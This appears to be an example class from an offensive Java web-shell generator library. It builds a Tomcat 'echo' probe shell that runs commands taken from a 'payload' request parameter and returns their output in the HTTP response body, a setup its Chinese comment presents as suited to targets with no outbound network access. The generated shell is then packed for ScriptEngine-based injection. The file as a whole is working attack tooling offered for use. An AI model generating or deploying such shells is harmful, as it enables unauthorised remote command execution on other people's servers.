package com.reajason.javaweb.examples.probe;

import com.reajason.javaweb.packer.ClassPackerConfig;
import com.reajason.javaweb.packer.Packers;
import com.reajason.javaweb.probe.ProbeContent;
import com.reajason.javaweb.probe.ProbeMethod;
import com.reajason.javaweb.probe.ProbeShellGenerator;
import com.reajason.javaweb.probe.ProbeShellResult;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.config.ResponseConfig;

import static com.reajason.javaweb.Server.Tomcat;

/**
 * 回显马（探测马）—— ResponseBody 探测：命中即把命令执行结果直接写进 HTTP 响应体，
 * 适用于目标不出网（无 DNS/HTTP 回连）的场景。
 *
 * @author ReaJason
 * @since 2025/8/13
 */
public class ResponseBodyProbe {
    public static void main(String[] args) {
        ProbeConfig probeConfig = ProbeConfig.builder()
                .probeMethod(ProbeMethod.ResponseBody)
                .probeContent(ProbeContent.Command)
                .shrink(true)
                .debug(false)
                .build();

        ResponseConfig responseConfig = ResponseConfig.builder()
                .server(Tomcat)
                .reqParamName("payload")
                .build();

        ProbeShellResult result = ProbeShellGenerator.generate(probeConfig, responseConfig);

        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(ClassPackerConfig.of(
                result.getShellClassName(), result.getShellBytes(), result.getShellBytesBase64Str(),
                result.getProbeConfig() != null && result.getProbeConfig().needByPassJavaModule())));
    }
}
